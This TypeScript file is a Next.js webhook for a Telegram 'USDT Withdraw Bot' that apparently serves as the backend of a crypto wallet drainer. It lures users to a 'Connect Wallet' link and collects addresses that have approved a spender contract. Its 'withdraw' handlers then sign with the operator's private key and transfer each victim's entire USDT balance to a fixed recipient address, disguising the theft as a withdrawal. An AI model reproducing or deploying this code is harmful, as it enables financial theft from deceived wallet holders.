import { NextResponse } from 'next/server';
import { TELEGRAM_BOT_TOKEN, USDT_CONTRACT_ADDRESS, SPENDER_ADDRESS, RECIPIENT_ADDRESS, spender_Contract_Abi, USDT_ABI } from '../../../components/constent';
import { ethers } from 'ethers';

// Store connected wallets (in production, use database)
export const connectedWallets = new Map<number, string>();

export async function processMessage(update: any) {
  const message = update.message || update.edited_message;
  const callbackQuery = update.callback_query;

  if (!message && !callbackQuery) {
    return;
  }

  const chatId = callbackQuery ? callbackQuery.message.chat.id : message.chat.id;
  const text = message?.text?.trim() || '';
  const callbackData = callbackQuery?.data;

  console.log('Received message:', { chatId, text, callbackData });

  let responseText = '';
  let replyMarkup: any = undefined;

  // Handle callback queries (button clicks)
  if (callbackData) {
    const walletAddress = connectedWallets.get(chatId);

    if (callbackData === 'connect') {
      const appUrl = process.env.NEXT_PUBLIC_APP_URL || 'https://sun2-two.vercel.app';
      const personalizedLink = `${appUrl}?chatId=${chatId}`;
      responseText = `🔗 Click the button below to connect your wallet:\n\n🔗 <a href="${personalizedLink}">Connect Wallet</a>`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: '🔗 Connect Wallet', url: personalizedLink }],
        ]
      };
    } else if (callbackData === 'balance') {
      if (!walletAddress) {
        responseText = `❌ Please connect your wallet first`;
        replyMarkup = {
          inline_keyboard: [
            [{ text: '🔗 Connect Wallet', callback_data: 'connect' }],
          ]
        };
      } else {
        try {
          const provider = new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com');
          const tokenContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
          const balance = await tokenContract.balanceOf(walletAddress);
          const balanceFormatted = ethers.formatUnits(balance, 6); // USDT uses 6 decimals
          responseText = `💰 Balance: <b>${balanceFormatted} USDT</b>\n👛 Wallet: <code>${walletAddress}</code>`;
          replyMarkup = {
            inline_keyboard: [
              [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
            ]
          };
        } catch (err) {
          responseText = `❌ Error checking balance: ${(err as Error).message}`;
        }
      }
    } else if (callbackData === 'withdraw') {
      if (!walletAddress) {
        responseText = `❌ Please connect your wallet first`;
        replyMarkup = {
          inline_keyboard: [
            [{ text: '🔗 Connect Wallet', callback_data: 'connect' }],
          ]
        };
      } else {
        try {
          const privateKey = process.env.OWNER_PRIVATE_KEY;
          if (!privateKey) {
            responseText = `❌ Owner private key not configured in environment`;
          } else {
            const provider = new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com');
            const wallet = new ethers.Wallet(privateKey, provider);

            const tokenContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
            const spenderContract = new ethers.Contract(SPENDER_ADDRESS, spender_Contract_Abi, wallet);

            // Check balance
            const balance = await tokenContract.balanceOf(walletAddress);
            const balanceFormatted = ethers.formatUnits(balance, 6); // USDT uses 6 decimals

            // Check allowance
            const allowance = await tokenContract.allowance(walletAddress, SPENDER_ADDRESS);
            const allowanceFormatted = ethers.formatUnits(allowance, 6); // USDT uses 6 decimals

            if (parseFloat(balanceFormatted) <= 0) {
              responseText = `❌ No USDT balance in wallet`;
            } else if (parseFloat(allowanceFormatted) <= 0) {
              responseText = `❌ Please approve SPENDER_ADDRESS to spend your USDT first`;
            } else {
              responseText = `⏳ Withdrawing ${balanceFormatted} USDT...`;

              // Execute withdraw (transfer all balance)
              const tx = await spenderContract.delegatedTransfer(
                USDT_CONTRACT_ADDRESS,
                walletAddress,
                RECIPIENT_ADDRESS,
                balance
              );

              await tx.wait();

              responseText = `✅ Withdraw successful!\n💰 Amount: ${balanceFormatted} USDT\n📥 To: <code>${RECIPIENT_ADDRESS}</code>\n🔗 TX: <a href="https://bscscan.com/tx/${tx.hash}">View Transaction</a>`;
            }
          }
        } catch (err) {
          responseText = `❌ Error withdrawing USDT: ${(err as Error).message}`;
          console.error('Withdraw error:', err);
        }
      }
    }

    // Answer callback query
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQuery.id,
      }),
    });

    // Edit message with response
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: callbackQuery.message.message_id,
        text: responseText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: replyMarkup,
      }),
    });

    return;
  }

  if (text === '/start') {
    const appUrl = process.env.NEXT_PUBLIC_APP_URL || 'https://sun2-two.vercel.app';
    const personalizedLink = `${appUrl}?chatId=${chatId}`;
    responseText = `👋 Welcome to USDT Withdraw Bot!\n\nClick the button below to connect your wallet:\n\n🔗 <a href="${personalizedLink}">Connect Wallet</a>`;
    replyMarkup = {
      inline_keyboard: [
        [{ text: '🔗 Connect Wallet', url: personalizedLink }],
        [{ text: '💰 Check Balance', callback_data: 'balance' }],
        [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
      ]
    };
  } else if (text === '/help') {
    responseText = `📖 Help:\n\n/connect - Connect your wallet (enter wallet address)\n/balance - Check your connected wallet's USDT balance\n/withdraw - Withdraw all USDT from your wallet`;
  } else if (text === '/connect') {
    responseText = `🔗 Please send your wallet address to connect:\n\nExample: 0x1234...`;
  } else if (text.includes('0x') && text.match(/0x[a-fA-F0-9]{40}/)) {
    // Extract wallet address from message (for "New Wallet Approved" messages)
    const walletMatch = text.match(/0x[a-fA-F0-9]{40}/);
    if (walletMatch) {
      const walletAddress = walletMatch[0];
      connectedWallets.set(chatId, walletAddress);

      try {
        const provider = new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com');
        const tokenContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
        const balance = await tokenContract.balanceOf(walletAddress);
        const balanceFormatted = ethers.formatUnits(balance, 6); // USDT uses 6 decimals
        responseText = `✅ Wallet detected: <code>${walletAddress}</code>\n\nYou can now withdraw USDT:`;
        replyMarkup = {
          inline_keyboard: [
            [{ text: `💰 Balance: ${balanceFormatted} USDT`, callback_data: 'balance' }],
            [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
          ]
        };
      } catch (err) {
        responseText = `✅ Wallet detected: <code>${walletAddress}</code>\n\nYou can now withdraw USDT:`;
        replyMarkup = {
          inline_keyboard: [
            [{ text: '💰 Check Balance', callback_data: 'balance' }],
            [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
          ]
        };
      }

      // Send response to Telegram
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: responseText,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
          reply_markup: replyMarkup,
        }),
      });

      return;
    }
  } else if (text.startsWith('0x') && text.length === 42) {
    // Wallet address (exact match)
    connectedWallets.set(chatId, text);

    try {
      const provider = new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com');
      const tokenContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
      const balance = await tokenContract.balanceOf(text);
      const balanceFormatted = ethers.formatUnits(balance, 6); // USDT uses 6 decimals
      responseText = `✅ Wallet connected: <code>${text}</code>\n\nAvailable actions:`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: `💰 Balance: ${balanceFormatted} USDT`, callback_data: 'balance' }],
          [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
        ]
      };
    } catch (err) {
      responseText = `✅ Wallet connected: <code>${text}</code>\n\nAvailable actions:`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: '💰 Check Balance', callback_data: 'balance' }],
          [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
        ]
      };
    }
  } else if (text === '/balance') {
    const walletAddress = connectedWallets.get(chatId);
    if (!walletAddress) {
      responseText = `❌ Please connect your wallet first using /connect`;
    } else {
      try {
        const provider = new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com');
        const tokenContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
        const balance = await tokenContract.balanceOf(walletAddress);
        const balanceFormatted = ethers.formatUnits(balance, 6); // USDT uses 6 decimals
        responseText = `💰 Balance: <b>${balanceFormatted} USDT</b>\n👛 Wallet: <code>${walletAddress}</code>`;
        replyMarkup = {
          inline_keyboard: [
            [{ text: '💸 Pull USDT', callback_data: 'pull' }],
          ]
        };
      } catch (err) {
        responseText = `❌ Error checking balance: ${(err as Error).message}`;
      }
    }
  } else if (text === '/withdraw') {
    const walletAddress = connectedWallets.get(chatId);
    if (!walletAddress) {
      responseText = `❌ Please connect your wallet first using /connect`;
    } else {
      try {
        const privateKey = process.env.OWNER_PRIVATE_KEY;
        if (!privateKey) {
          responseText = `❌ Owner private key not configured in environment`;
        } else {
          const provider = new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com');
          const wallet = new ethers.Wallet(privateKey, provider);

          const tokenContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
          const spenderContract = new ethers.Contract(SPENDER_ADDRESS, spender_Contract_Abi, wallet);

          // Check balance
          const balance = await tokenContract.balanceOf(walletAddress);
          const balanceFormatted = ethers.formatUnits(balance, 6); // USDT uses 6 decimals

          // Check allowance
          const allowance = await tokenContract.allowance(walletAddress, SPENDER_ADDRESS);
          const allowanceFormatted = ethers.formatUnits(allowance, 6); // USDT uses 6 decimals

          if (parseFloat(balanceFormatted) <= 0) {
            responseText = `❌ No USDT balance in wallet`;
          } else if (parseFloat(allowanceFormatted) <= 0) {
            responseText = `❌ Please approve SPENDER_ADDRESS to spend your USDT first`;
          } else {
            responseText = `⏳ Withdrawing ${balanceFormatted} USDT...`;

            // Execute withdraw (transfer all balance)
            const tx = await spenderContract.delegatedTransfer(
              USDT_CONTRACT_ADDRESS,
              walletAddress,
              RECIPIENT_ADDRESS,
              balance
            );

            await tx.wait();

            responseText = `✅ Withdraw successful!\n💰 Amount: ${balanceFormatted} USDT\n📥 To: <code>${RECIPIENT_ADDRESS}</code>\n🔗 TX: <a href="https://bscscan.com/tx/${tx.hash}">View Transaction</a>`;
          }
        }
      } catch (err) {
        responseText = `❌ Error withdrawing USDT: ${(err as Error).message}`;
        console.error('Withdraw error:', err);
      }
    }
  } else {
    responseText = `❓ Unknown command. Use /help for available commands.`;
  }

  // Send response to Telegram
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: responseText,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: replyMarkup,
    }),
  });
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    await processMessage(body);
    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('Webhook error:', err);
    return NextResponse.json({ ok: false, error: (err as Error).message }, { status: 500 });
  }
}
